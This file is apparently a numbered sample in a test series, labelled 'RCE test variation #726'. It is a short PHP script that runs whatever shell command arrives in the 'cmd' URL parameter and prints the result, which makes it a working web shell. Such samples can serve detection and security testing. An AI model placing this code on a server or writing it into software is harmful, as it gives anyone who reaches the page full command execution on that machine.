<?php
// RCE test variation #726
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>